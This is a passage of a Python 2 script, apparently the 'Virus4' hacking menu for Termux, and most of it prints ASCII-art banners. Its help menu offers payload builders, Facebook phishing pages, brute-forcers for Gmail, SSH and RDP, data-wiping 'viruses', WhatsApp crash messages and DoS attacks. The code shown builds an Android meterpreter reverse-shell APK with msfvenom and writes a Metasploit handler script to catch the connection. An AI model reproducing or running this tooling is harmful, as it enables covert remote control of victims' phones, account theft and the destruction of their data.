 time.sleep(0.01)
 print cyan +"""                 `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@'              """
 time.sleep(0.01)
 print cyan +"""                  @@@@@@@@~@@@~@@@~@@@~@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""                   @@@@@@@@@@@@@@@@@@@@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""                    @@@@@@@@~@@@~@@@~@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""                     @@@@@@@@@@@@@@@@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""                      @@@@@@@@~@@@~@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""                       `@@@@@@@@@@@@@@@@@'              """
 time.sleep(0.01)
 print cyan +"""                           ~~@@@@@@@~~              """
 time.sleep(0.01)
def sem_15():
 sem_1()
 time.sleep(0.01)
 print cyan +"""                     @@@              """
 time.sleep(0.01)
 print cyan +"""                     @@@              """
 time.sleep(0.01)
 print cyan +"""                      @@@              """
 time.sleep(0.01)
 print cyan +"""                      @@@              """
 time.sleep(0.01)
 print cyan +"""              @@@@@@@@@@@@@@@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""            @@@@@@@@@@@@@@@@@@@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""        @@@@@@@@ @@@@@@@@@@@@@@@@ @@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""      @@@@@@@@@   @@@@@@@@@@@@@@   @@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""    @@@@@@@@@@     @@@@@@@@@@@@     @@@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""   @@@@@@@@@@       @@@@  @@@@       @@@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""   @@@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""   @@@@@@@@@@@@@@@@@@        @@@@@@@@@@@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""   @@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""    @@@@@@@@  @@ @@ @@ @@ @@ @@ @@ @  @@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""      @@@@@@@                        @@@@@@@              """
 time.sleep(0.01)
 print cyan +"""        @@@@@@  @@ @@ @@ @@ @@ @@ @ @@@@@@              """
 time.sleep(0.01)
 print cyan +"""          @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""            @@@@@@@@@@@@@@@@@@@@@@@@@@              """
 time.sleep(0.01)
 print cyan +"""              @@@@@@@@@@@@@@@@@@@@@@              """
def sem_16():
 sem_1()
 time.sleep(0.01)
 print cyan +"""                                         .,,cccd$$$$$$$$$$$ccc,              """
 time.sleep(0.01)
 print cyan +"""                                     ,cc$$$$$$$$$$$$$$$$$$$$$$$$$cc,              """
 time.sleep(0.01)
 print cyan +"""                                   ,d$$$$$$$$$$$$$$$$"J$$$$$$$$$$$$$$c,              """
 time.sleep(0.01)
 print cyan +"""                                 d$$$$$$$$$$$$$$$$$$,$" ,,`?$$$$$$$$$$$$L              """
 time.sleep(0.01)
 print cyan +"""                               ,$$$$$$$$$$$$$$$$$$$$$',J$$$$$$$$$$$$$$$$$b              """
 time.sleep(0.01)
 print cyan +"""                              ,$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$i `$h              """
 time.sleep(0.01)
 print cyan +"""                              $$$$$$$$$$$$$$$$$$$$$$$$$P'  "$$$$$$$$$$$h $$              """
 time.sleep(0.01)
 print cyan +"""                             ;$$$$$$$$$$$$$$$$$$$$$$$$F,$$$h,?$$$$$$$$$$h$F              """
 time.sleep(0.01)
 print cyan +"""                             `$$$$$$$$$$$$$$$$$$$$$$$F:??$$$:)$$$$P",. $$F              """
 time.sleep(0.01)
 print cyan +"""                              ?$$$$$$$$$$$$$$$$$$$$$$(   `$$ J$$F"d$$F,$F              """
 time.sleep(0.01)
 print cyan +"""                               ?$$$$$$$$$$$$$$$$$$$$$h,  :P'J$$F  ,$F,$"              """
 time.sleep(0.01)
 print cyan +"""                                ?$$$$$$$$$$$$$$$$$$$$$$$ccd$$`$h, ",d$              """
 time.sleep(0.01)
 print cyan +"""                                 "$$$$$$$$$$$$$$$$$$$$$$$$",cdc $$$$"              """
 time.sleep(0.01)
 print cyan +"""                        ,uu,      `?$$$$$$$$$$$$$$$$$$$$$$$$$$$c$$$$h              """
 time.sleep(0.01)
 print cyan +"""                    .,d$$$$$$$cc,   `$$$$$$$$$$$$$$$$??$$$$$$$$$$$$$$$,              """
 time.sleep(0.01)
 print cyan +"""                  ,d$$$$$$$$$$$$$$$bcccc,,??$$$$$$ccf `"??$$$$??$$$$$$$              """
 time.sleep(0.01)
 print cyan +"""                 d$$$$$$$$$$$$$$$$$$$$$$$$$h`?$$$$$$h`:...  d$$$$$$$$P              """
 time.sleep(0.01)
 print cyan +"""                d$$$$$$$$$$$$$$$$$$$$$$$$$$$$`$$$$$$$hc,,cd$$$$$$$$P"              """
 time.sleep(0.01)
 print cyan +"""            =$$?$$$$$$$$P' ?$$$$$$$$$$$$$$$$$;$$$$$$$$$???????",,              """
 time.sleep(0.01)
 print cyan +"""               =$$$$$$F       `"?????$$$$$$$$$$$$$$$$$$$$$$$$$$$$$bc              """
 time.sleep(0.01)
 print cyan +"""               d$$F"?$$k ,ccc$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$i              """
 time.sleep(0.01)
 print cyan +"""        .     ,ccc$$c`""u$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$P",$$$$$$$$$$$$h              """
 time.sleep(0.01)
 print cyan +"""     ,d$$$L  J$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$" `""$$$??$$$$$$$              """
 time.sleep(0.01)
 print cyan +"""   ,d$$$$$$c,"$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$F       `?J$$$$$$$'              """
 time.sleep(0.01)
 print cyan +"""  ,$$$$$$$$$$h`$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$F           ?$$$$$$$P""=,              """
 time.sleep(0.01)
 print cyan +""" ,$$$F?$$$$$$$ $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$F              3$$$$II"?$h,              """
 time.sleep(0.01)
 print cyan +""" $$$$$`$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$P"               ;$$$??$$$,"?"              """
 time.sleep(0.01)
 print cyan +""" $$$$F ?$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$P",z'                3$$h   ?$F              """
 time.sleep(0.01)
 print cyan +"""        `?$$$$$$$$$$$$$$$??$$$$$$$$$PF"',d$P"                  "?$F              """
 time.sleep(0.01)
 print cyan +"""           """""""         ,z$$$$$$$$$$$$$P              """
 time.sleep(0.01)
 print cyan +"""                          J$$$$$$$$$$$$$$F              """
 time.sleep(0.01)
 print cyan +"""                         ,$$$$$$$$$$$$$$F              """
 time.sleep(0.01)
 print cyan +"""                         :$$$$$c?$$$$PF'              """
 time.sleep(0.01)
 print cyan +"""                         `$$$$$$$P              """
 time.sleep(0.01)
 print cyan +"""                          `?$$$$F              """
 time.sleep(0.01)
 
def sem_17():
 sem_1()
 time.sleep(0.01)
 print cyan +""" ,                                                               ,              """
 time.sleep(0.01)
 print cyan +""" \'.                                                           .'/              """
 time.sleep(0.01)
 print cyan +"""  ),\                                                         /,(               """
 time.sleep(0.01)
 print cyan +""" /__\'.                                                     .'/__\              """
 time.sleep(0.01)
 print cyan +""" \  `'.'-.__                                           __.-'.'`  /              """
 time.sleep(0.01)
 print cyan +"""  `)   `'-. \                                         / .-'`   ('              """
 time.sleep(0.01)
 print cyan +"""  /   _.--'\ '.          ,               ,          .' /'--._   \              """
 time.sleep(0.01)
 print cyan +"""  |-'`      '. '-.__    / \             / \    __.-' .'      `'-|              """
 time.sleep(0.01)
 print cyan +"""  \         _.`'-.,_'-.|/\ \    _,_    / /\|.-'_,.-'`._         /              """
 time.sleep(0.01)
 print cyan +"""   `\    .-'       /'-.|| \ |.-"   "-.| / ||.-'\       '-.    /`              """
 time.sleep(0.01)
 print cyan +"""     )-'`        .'   :||  / -.\\ //.- \  ||:   '.        `'-(              """
 time.sleep(0.01)
 print cyan +"""    /          .'    / \\_ |  /o`^'o\  | _// \    '.          \              """
 time.sleep(0.01)
 print cyan +"""    \       .-'    .'   `--|  `"/ \"`  |--`   '.    '-.       /              """
 time.sleep(0.01)
 print cyan +"""     `)  _.'     .'    .--.; |\__"__/| ;.--.    '.     '._  ('              """
 time.sleep(0.01)
 print cyan +"""     /_.'     .-'  _.-'     \\ \/^\/ //     `-._  '-.     '._\              """
 time.sleep(0.01)
 print cyan +"""     \     .'`_.--'          \\     //          `--._`'.     /              """
 time.sleep(0.01)
 print cyan +"""      '-._' /`            _   \\-.-//   _            `\ '_.-'              """
 time.sleep(0.01)
 print cyan +"""          `<     _,..--''`|    \`"`/    |`''--..,_     >`              """
 time.sleep(0.01)
 print cyan +"""           _\  ``--..__   \     `'`     /   __..--``  /_              """
 time.sleep(0.01)
 print cyan +"""          /  '-.__     ``'-;    / \    ;-'``     __.-'  \              """
 time.sleep(0.01)
 print cyan +"""         |    _   ``''--..  \'-' | '-'/  ..--''``   _    |              """
 time.sleep(0.01)
 print cyan +"""         \     '-.       /   |/--|--\|   \       .-'     /              """
 time.sleep(0.01)
 print cyan +"""          '-._    '-._  /    |---|---|    \  _.-'    _.-'              """
 time.sleep(0.01)
 print cyan +"""              `'-._   '/ / / /---|---\ \ \ \'   _.-'`              """
 time.sleep(0.01)
 print cyan +"""                   '-./ / / / \`---`/ \ \ \ \.-'              """
 time.sleep(0.01)
 print cyan +"""                       `)` `  /'---'\  ` `(`              """
 time.sleep(0.01)
 print cyan +"""                 jgs  /`     |       |     `\              """
 time.sleep(0.01)
 print cyan +"""                     /  /  | |       | |  \  \              """
 time.sleep(0.01)
 print cyan +"""                 .--'  /   | '.     .' |   \  '--.              """
 time.sleep(0.01)
 print cyan +"""                /_____/|  / \._\   /_./ \  |\_____\              """
 time.sleep(0.01)
 print cyan +"""               (/      (/'     \) (/     `\)      \)              """
 time.sleep(0.01)

def sem_18():
 sem_1()
 time.sleep(0.01)
 print cyan +'''                          ooo              '''
 time.sleep(0.01)
 print cyan +'''                         $ o$              '''
 time.sleep(0.01)
 print cyan +'''                        o $$              '''
 time.sleep(0.01)
 print cyan +'''              ""$$$    o" $$ oo "              '''
 time.sleep(0.01)
 print cyan +'''          " o$"$oo$$$"o$$o$$"$$$$$ o              '''
 time.sleep(0.01)
 print cyan +'''         $" "o$$$$$$o$$$$$$$$$$$$$$o     o              '''
 time.sleep(0.01)
 print cyan +'''      o$"    "$$$$$$$$$$$$$$$$$$$$$$o" "oo  o              '''
 time.sleep(0.01)
 print cyan +'''     " "     o  "$$$o   o$$$$$$$$$$$oo$$              '''
 time.sleep(0.01)
 print cyan +'''    " $     " "o$$$$$ $$$$$$$$$$$"$$$$$$$o              '''
 time.sleep(0.01)
 print cyan +'''  o  $       o o$$$$$"$$$$$$$$$$$o$$"""$$$$o " "              '''
 time.sleep(0.01)
 print cyan +''' o          o$$$$$"    "$$$$$$$$$$ "" oo $$   o $              '''
 time.sleep(0.01)
 print cyan +''' $  $       $$$$$  $$$oo "$$$$$$$$o o $$$o$$oo o o              '''
 time.sleep(0.01)
 print cyan +'''o        o $$$$$oo$$$$$$o$$$$ ""$$oo$$$$$$$$"  " "o              '''
 time.sleep(0.01)
 print cyan +'''"   o    $ ""$$$$$$$$$$$$$$  o  "$$$$$$$$$$$$   o "              '''
 time.sleep(0.01)
 print cyan +'''"   $      "$$$$$$$$$$$$$$   "   $$$"$$$$$$$$o  o              '''
 time.sleep(0.01)
 print cyan +'''$   o      o$"""""$$$$$$$$    oooo$$ $$$$$$$$"  "              '''
 time.sleep(0.01)
 print cyan +'''$      o""o $$o    $$$$$$$$$$$$$$$$$ ""  o$$$   $ o              '''
 time.sleep(0.01)
 print cyan +''' o     " "o "$$$$  $$$$$""""""""""" $  o$$$$$"" o o              '''
 time.sleep(0.01)
 print cyan +''' "  " o  o$o" $$$$o   ""           o  o$$$$$"   o              '''
 time.sleep(0.01)
 print cyan +'''  $         o$$$$$$$oo            "oo$$$$$$$"    o              '''
 time.sleep(0.01)
 print cyan +'''  "$   o o$o $o o$$$$$"$$$$oooo$$$$$$$$$$$$$$"o$o              '''
 time.sleep(0.01)
 print cyan +'''    "o oo  $o$"oo$$$$$o$$$$$$$$$$$$"$$$$$$$$"o$"              '''
 time.sleep(0.01)
 print cyan +'''     "$ooo $$o$   $$$$$$$$$$$$$$$$ $$$$$$$$o"              '''
 time.sleep(0.01)
 print cyan +'''        "" $$$$$$$$$$$$$$$$$$$$$$" """"              '''
 time.sleep(0.01)
 print cyan +'''                         """"""              '''
 time.sleep(0.01)
 
def sem_19():
 sem_1()
 time.sleep(0.01)
 print cyan +"""                        ,mmmmm,            ______     _________              """
 time.sleep(0.01)
 print cyan +"""                        @ooooo@,         / /. . \\   /./-----\.\              """
 time.sleep(0.01)
 print cyan +"""                        @0m0m0Q@        / /. . .`,\\>./,  ,  ,\.\              """
 time.sleep(0.01)
 print cyan +"""                        @0X00X@@       | |. . .  |:|\|   ,  ,  |.|              """
 time.sleep(0.01)
 print cyan +"""                     ____@0m00@_____   | | . . . |:|X| ,  ,  , |.|              """
 time.sleep(0.01)
 print cyan +"""                    @@@op(oboy)pop@@Ok | |. . .  |:|\|   ,  ,  |.|              """
 time.sleep(0.01)
 print cyan +"""                   @@@@opopopopop@@@p@@| | . . . |:|\| ,  ,  , |.|              """
 time.sleep(0.01)
 print cyan +"""                   @@o@@opopopopop@@op@@,|. . .  |:|\|   ,  ,  |.|              """
 time.sleep(0.01)
 print cyan +"""                   @@o@@popopopopopop@o@@| . . . |:|X| ,  ,  , |.|              """
 time.sleep(0.01)
 print cyan +"""                    @@o@@mmmmmmgogogo@oo@|. . .  |:|\|   ,  ,  |.|              """
 time.sleep(0.01)
 print cyan +"""                     @@@@@@@mmm'ooo@|@oo@| . . . |:|\| ,  ,  , |.|              """
 time.sleep(0.01)
 print cyan +"""                      @oooooooOOOO@"  @o@|. . .  |:|\|   ,  ,  |.|              """
 time.sleep(0.01)
 print cyan +"""                      @OoOoO@OoOoO@   @@@| . . . |:|X| ,  ,  , |.|              """
 time.sleep(0.01)
 print cyan +"""                      @oooo@@@oooo@   @@@|. . . .|:|\|   ,  ,  |.|              """
 time.sleep(0.01)
 print cyan +"""                     .@@@o@@@@ooo@@  ,@@}| . . .//  \\_________/.|              """
 time.sleep(0.01)
 print cyan +"""                    .@@oo@@@@@@ooo@. "@@'|. . //     \==========/              """
 time.sleep(0.01)
 print cyan +"""                   .@ooooo@@@@@oooo@      \ //              """
 time.sleep(0.01)
 print cyan +"""                   @ooooO@' `@@ooo@|              """
 time.sleep(0.01)
 print cyan +"""                   @oooo@'   `@oooo@              """
 time.sleep(0.01)
 print cyan +"""                  @ooo@'     `oooo@|                    """
 time.sleep(0.01)
 print cyan +"""                  @oo@@'      `@oo@|                    """
 time.sleep(0.01)
 print cyan +"""                  @o@@|        @@o@,                         """
 time.sleep(0.01)
 print cyan +"""                  @@@@:        @@o@|                              """
 time.sleep(0.01)
 print cyan +"""                  @@@@:        @@o@|                        """
 time.sleep(0.01)
 print cyan +"""                  `@oo:        `@@@:              """
 time.sleep(0.01)
 print cyan +"""                  /@@@)        /@@@)              """
 time.sleep(0.01)
 print cyan +"""                (@@@@/       (@@@@/                        """
 time.sleep(0.01)
def help():
 print ''
 print cyan +"    {1} metasploit"
 print cyan +"       [1]exploit Android"
 time.sleep(0.05)
 print cyan + "          [1]create payload  Android"
 time.sleep(0.05)
 print cyan + "          [2]Android  penetration msf"
 time.sleep(0.05)
 print cyan +"           [3]URL     penetration msf"
 print cyan +"       [2]exploit Mac"
 time.sleep(0.05)
 print cyan +"          [1]create payload  Mac"
 time.sleep(0.05)
 print cyan +"          [2]Mac  penetration msf"
 time.sleep(0.05)
 print cyan +"       [3]exploit Windows"
 time.sleep(0.05)
 print cyan +"          [1]create payload  Windows"
 time.sleep(0.05)
 print cyan +"          [2]Windows  penetration msf"
 time.sleep(0.05)
 print cyan +"          [3]URL     penetration msf"
 print cyan +"       [4]exploit Linux"
 time.sleep(0.05)
 print cyan +"          [1]create payload  Linux"
 time.sleep(0.05)
 print cyan +"          [2]Linux  penetration msf"
 time.sleep(0.05)
 print cyan +"       [5]exploit python"
 time.sleep(0.05)
 print cyan +"          [1]create payload  python"
 time.sleep(0.05)
 print cyan +"          [2]python penetration msf"
 time.sleep(0.05)
 print cyan +"       [6]exploit bash"
 time.sleep(0.05)
 print cyan +"          [1]create payload  bash"
 time.sleep(0.05)
 print cyan +"          [2]bash penetration msf"
 time.sleep(0.05)
 print cyan +"       [7]exploit perl"
 time.sleep(0.05)
 print cyan +"          [1]create payload  perl"
 time.sleep(0.05)
 print cyan +"          [2]perl penetration msf"
 time.sleep(0.05)
 print cyan +"       [8]exploit php"
 time.sleep(0.05)
 print cyan +"          [1]create payload  php"
 time.sleep(0.05)
 print cyan +"          [2]php penetration msf"
 time.sleep(0.05)
 print cyan +"       [9]exploit ruby"
 time.sleep(0.05)
 print cyan +"          [1]create payload  ruby"
 time.sleep(0.05)
 print cyan +"          [2]ruby penetration msf"
 time.sleep(0.05)
 print cyan +"       [10]exploit java"
 time.sleep(0.05)
 print cyan +"          [1]create payload  java"
 time.sleep(0.05)
 print cyan +"          [2]java penetration msf"
 time.sleep(0.05)
 print cyan +"       [11]exploit powershell"
 time.sleep(0.05)
 print cyan +"          [1]create payload  powershell"
 time.sleep(0.05)
 print cyan +"          [2]powershell penetration msf"
 time.sleep(0.05)
 print cyan +"       [12]Breakthrough via Port"
 time.sleep(0.05)
 print cyan +"          [1]Breakthrough via Port (21)"
 time.sleep(0.05)
 print cyan +"          [2]Breakthrough via Port (443)"
 time.sleep(0.05)
 print cyan +"       [13]download metaspoit framework"
 print ''
 print cyan +"    {2}download "
 print cyan +"       [01] Information Gathering"
 time.sleep(0.05)
 print cyan +"       [02] Vulnerability Scanner"
 time.sleep(0.05)
 print cyan +"       [03] Stress Testing"
 time.sleep(0.05)
 print cyan +"       [04] Password Attacks"
 time.sleep(0.05)
 print cyan +"       [05] Web Hacking"
 time.sleep(0.05)
 print cyan +"       [06] Exploitation Tools"
 time.sleep(0.05)
 print cyan +"       [07] Sniffing & Spoofing"
 print ''
 print cyan +"    {3}account"
 print cyan +"       [1]account facebook"
 print cyan +'          [01]Guess facebook '
 time.sleep(0.05)
 print cyan +'          [02]Available facebook'
 time.sleep(0.05)
 print cyan +'          [03]A fake page for Facebook'
 time.sleep(0.05)
 print cyan +'          [04]get data account facebook'
 time.sleep(0.05)
 print cyan +'          [05]Shield protection facebook'
 time.sleep(0.05)
 time.sleep(0.05)
 print cyan +'       [02]Account instgram'
 time.sleep(0.05)
 print cyan +'       [03]Account mail'
 time.sleep(0.05)
 
 time.sleep(0.05)
 print cyan+"           [01] Cisco Brute Force         "
 time.sleep(0.05)
 print cyan+"           [02] VNC Brute Force           "
 time.sleep(0.05)
 print cyan+"           [03] FTP Brute Force           "
 time.sleep(0.05)
 print cyan+"           [04] Gmail Brute Force         "
 time.sleep(0.05)
 print cyan+"           [05] SSH Brute Force           "
 time.sleep(0.05)
 print cyan+"           [06] TeamSpeak Brute Force     "
 time.sleep(0.05)
 print cyan+"           [07] Telnet Brute Force        "
 time.sleep(0.05)
 print cyan+"           [08] Yahoo Mail Brute Force    "
 time.sleep(0.05)
 print cyan+"           [09] Hotmail Brute Force       "
 time.sleep(0.05)
 print cyan+"           [10] Router Speedy Brute Force "
 time.sleep(0.05)
 print cyan+"           [11] RDP Brute Force           "
 time.sleep(0.05)
 print cyan+"           [12] MySQL Brute Force         "
 print cyan +'       [04]Create list password '
 print ''
 print cyan +"    {4}virus"
 time.sleep(0.05)
 print cyan +'       [01]Virus android '
 time.sleep(0.05)
 print cyan +'          [01]Create a normal {virus} '
 time.sleep(0.05)
 print cyan +'          [02]Create a semi-facebook  {virus}'
 time.sleep(0.05)
 print cyan +'          [03]Create a semi-instagram {virus}'
 time.sleep(0.05)
 print cyan +'          [04]Create a semi-messenger {virus}'
 time.sleep(0.05)
 print cyan +'          [05]Create a semi-whatsapp  {virus}'
 time.sleep(0.05)
 print cyan +'       [02]Virus windows'
 time.sleep(0.05)
 print cyan +'       [03]Virus mac'
 time.sleep(0.05)
 print cyan +'       [04]Virus linux'
 time.sleep(0.05)
 print cyan +'          [01]Create a virus delete everything {bash}'
 time.sleep(0.05)
 print cyan +'          [02]Create a virus exploding area {bash}'
 time.sleep(0.05)
 time.sleep(0.05)
 print cyan +'       [05]Virus whatsapp'
 time.sleep(0.05)
 print cyan +'          [01]Virus1 ( message ) { .txt }'
 time.sleep(0.05)
 print cyan +'          [02]Virus2 ( message ) { .txt }'
 time.sleep(0.05)
 print cyan +'          [03]Virus3 ( message ) { .txt }'
 time.sleep(0.05)
 print cyan +'          [04]Virus4 ( message ) { .txt }'
 time.sleep(0.05)
 print cyan +'          [05]Virus5 ( message ) { .txt }'
 time.sleep(0.05)
 print cyan +'          [06]Virus6 ( message ) { .txt }'
 time.sleep(0.05)
 print cyan +'          [07]Virus7 ( message ) { .txt }'
 time.sleep(0.05)
 print cyan +'          [08]Virus8 ( message ) { .txt }'
 time.sleep(0.05)
 print cyan +'          [09]Virus9 ( message ) { .txt }'
 time.sleep(0.05)
 print cyan +'          [10]Anti-Virus1 { .txt }'
 time.sleep(0.05)
 print cyan +'          [11]Anti-Virus2 { .txt }'
 time.sleep(0.05)
 print cyan +'          [12]send virus chat Whatsapp { .txt }'
 time.sleep(0.05)
 print cyan +'       [06]Upload {Virus} and {payload}'
 time.sleep(0.05)
 print ''
 print cyan +'    {5}ngrok'
 time.sleep(0.05)
 print cyan +'       [01]open ngrok http'
 time.sleep(0.05)
 print cyan +'       [02]open ngrok tcp'
 time.sleep(0.05)
 print cyan +'       [03]Download ngrok'
 time.sleep(0.05)
 print ''
 print cyan +'    {6}nmap'
 time.sleep(0.05)
 print cyan +'        [01]nmap wihout root'
 time.sleep(0.05)
 print cyan +'           [01]Check the ip'
 time.sleep(0.05)
 print cyan +'           [02]All Devices'
 time.sleep(0.05)
 print cyan +'           [03]Guess on ip'
 time.sleep(0.05)
 print cyan +'           [04]For UDP ports'
 time.sleep(0.05)
 print cyan +'           [05]Versions ports'
 time.sleep(0.05)
 print cyan +'           [06]For TCP ports'
 time.sleep(0.05)
 time.sleep(0.05)
 print cyan +'        [02]nmap with root'
 time.sleep(0.05)
 print cyan +'           [01]send packit SYN'
 time.sleep(0.05)
 print cyan +'           [02]Device type'
 time.sleep(0.05)
 print cyan +'           [03]Firewall strength'
 time.sleep(0.05)
 print cyan +'           [04]For UDP ports'
 time.sleep(0.05)
 print cyan +'           [05]QUICK SCAN PLUS'
 time.sleep(0.05)
 print cyan +'           [06]QUICK traceroute'
 time.sleep(0.05)
 time.sleep(0.05)
 print ''
 print cyan +'    {7}games'
 time.sleep(0.05)
 print cyan +'       [01]games snake'
 time.sleep(0.05)
 print cyan +'       [02]games moon-buggy'
 time.sleep(0.05)
 print cyan +'       [02]games greed'
 time.sleep(0.05)
 print ''
 print cyan +'    {8}termux'
 time.sleep(0.05)
 print cyan +'       [01]Change the shape of Termux'
 time.sleep(0.05)
 print cyan +'       [02]Change shape of the skull Termux'
 time.sleep(0.05)
 print cyan +'       [03]Change shape of the skull(2) Termux'
 print ''
 print cyan +'    {9}website'
 time.sleep(0.05)
 print cyan +'       [01]Dos Attack'
 time.sleep(0.05)
 print cyan +'       [02]Admin panel finder'
 time.sleep(0.05)
 print cyan +'       [03]hash id '
 time.sleep(0.05)
 print cyan +'       [04]HaCk WEB SQL'
 time.sleep(0.05)
 print cyan +'          [01]Hack web sql in Termux'
 time.sleep(0.05)
 print cyan +'          [02]Hack web sql in Kali linux'
 time.sleep(0.05)
 time.sleep(0.05)
 print cyan +'       [05]Dork Google'
 time.sleep(0.05)
 raw_input('enter ')
 Virus4()
 
def error():
 print red + ' ______ _____  _____   ____  _____  '
 print red + '|  ____|  __ \|  __ \ / __ \|  __ \ '
 print red + '| |__  | |__) | |__) | |  | | |__) |'
 print red + '|  __| |  _  /|  _  /| |  | |  _  / '
 print red + '| |____| | \ \| | \ \| |__| | | \ \ '
 print red + '|______|_|  \_\_|  \_\\____/|_|  \_\ '

def exit():
 print blue + '  _    _          _____  _______     __  _____      __     __  '
 print blue + ' | |  | |   /\   |  __ \|  __ \ \   / / |  __ \   /\\ \   / /  '
 print blue + ' | |__| |  /  \  | |__) | |__) \ \_/ /  | |  | | /  \\ \_/ /   '
 print blue + ' |  __  | / /\ \ |  ___/|  ___/ \   /   | |  | |/ /\ \\   /    '
 print blue + ' | |  | |/ ____ \| |    | |      | |    | |__| / ____ \| |     '
 print blue + ' |_|  |_/_/    \_\_|    |_|      |_|    |_____/_/    \_\_|     '
 sys.exit()
def creat_virus():
 print ''
 print blue +' [*] Create a Virus'
 time.sleep(2)
 print ''
 time.sleep(0.05)
 print green +" [*] Done"
def backtomenu_virus():
	print ''
	print ''
	print red +"   [00] back to main menu "
	print red +"   [99] exit the Virus4 "
	nember = raw_input("enter your nember ===> ")
	if nember == '0' or nember == "00" :
		virus()
	elif nember == "99" :
		exit()
        else :
         error()
         virus()
def backtomenu_website():
	print ''
	print ''
	print red +"   [00] back to main menu "
	print red +"   [99] exit the Virus4 "
	nember = raw_input("enter your nember ===> ")
	if nember == '0' or nember == "00" :
		website()
	elif nember == "99" :
		exit()
        else :
         error()
         website()

def backtomenu_option():
	print ''
	print ''
	print red +"   [00] back to main menu "
	print red +"   [99] exit the Virus4 "
	nember = raw_input("enter your nember ===> ")
	if nember == '0' or nember == "00" :
		download()
	elif nember == "99" :
		exit()
        else :
         error()
         download()
def backtomenu_msf():
	print ''
	print ''
	print red +"   [00] back to main menu "
	print red +"   [99] exit the Virus4 "
	nember = raw_input("enter your nember ===> ")
	if nember == '0' or nember == "00" :
		metasploitf()
	elif nember == "99" :
		exit()
        else :
         error()
         metasploitf()
def backtomenu_ngrok():
	print ''
	print ''
	print red +"   [00] back to main menu "
	print red +"   [99] exit the Virus4 "
	nember = raw_input("enter your nember ===> ")
	if nember == '0' or nember == "00" :
		Ngrok()
	elif nember == "99" :
		exit()
        else :
         error()
         Ngrok()
def backtomenu_nmap():
	print ''
	print ''
	print red +"   [00] back to main menu "
	print red +"   [99] exit the Virus4 "
	nember = raw_input("enter your nember ===> ")
	if nember == '0' or nember == "00" :
		Nmap()
	elif nember == "99" :
		exit()
        else :
         error()
         Nmap()
def backtomenu_games():
	print ''
	print ''
	print red +"   [00] back to main menu "
	print red +"   [99] exit the Virus4 "
	nember = raw_input("enter your nember ===> ")
	if nember == '0' or nember == "00" :
		games()
	elif nember == "99" :
		exit()
        else :
         error()
         games()
def creat_payload():
 print ''
 print blue +' [*] Create a payload'
 time.sleep(2)
 print ''
 time.sleep(0.05)
 print green +" [*] Done"
def backtomenu_account():
	print ''
	print ''
	print red +"   [00] back to main menu "
	print red +"   [99] exit the Virus4 "
	nember = raw_input("enter your nember ===> ")
	if nember == '0' or nember == "00" :
		account()
	elif nember == "99" :
		exit()
        else :
         error()
         account()
def backtomenu_termux():
	print ''
	print ''
	print red +"   [00] back to main menu "
	print red +"   [99] exit the Virus4 "
	nember = raw_input("enter your nember ===> ")
	if nember == '0' or nember == "00" :
		termux()
	elif nember == "99" :
		exit()
        else :
         error()
         termux()
def kk(t):
   import sys, time
   for txt in t + "\n":
        sys.stdout.write(txt)
        sys.stdout.flush()
        time.sleep(9. / 5000)
def gg(t):
   import sys, time
   for txt in t + "\n":
        sys.stdout.write(txt)
        sys.stdout.flush()
        time.sleep(9. / 10000)
f = "         | \033[1;32m [\033[1;33m20\033[1;32m] Follow my channel {\033[1;31mYouTube\033[1;32m}         |"
y = "         |  \033[1;32m[\033[1;33m30\033[1;32m] Continue my account {\033[1;34mFacebook\033[1;32m}      |"
h = "  \033[1;33m[\033[1;32m*\033[1;33m] Welcome to my friend on {\033[1;36mVirus4\033[1;33m} Programmer [\033[1;32mAmer Amerr\033[1;33m] "
def android():
 ip = raw_input("     ip-----> ")
 time.sleep(2)
 port = raw_input("     port---> ")
 time.sleep(2)
 name = raw_input("     name---> ")
 time.sleep(2)
 creat_payload()
 os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f raw > $HOME/"+name+".apk")
 print cyan +'Path of the pyload----->  ' +red +"$HOME/"+name+".apk"
 backtomenu_msf()
def androidm():
 ip = raw_input("     ip-----> " )
 time.sleep(2)
 port = raw_input("     port---> " )
 time.sleep(2)
 os.system('rm -rf msf.rc')
 f = open('msf.rc' , 'w')
 f.write('''
use multi/handler
set payload android/meterpreter/reverse_tcp 
set lhost '''+ip+'''
set lport '''+port+'''
exploit -j
rm -rf msf.rc
''')
 f.close()
 os.system('msfconsole -r msf.rc')
def androidurl():
 ip = raw_input("     ip-----> " )
 time.sleep(2)
 port = raw_input("     port---> " )
 time.sleep(2)
 os.system('rm -rf msf.rc')
 f = open('msf.rc' , 'w')
 f.write('''
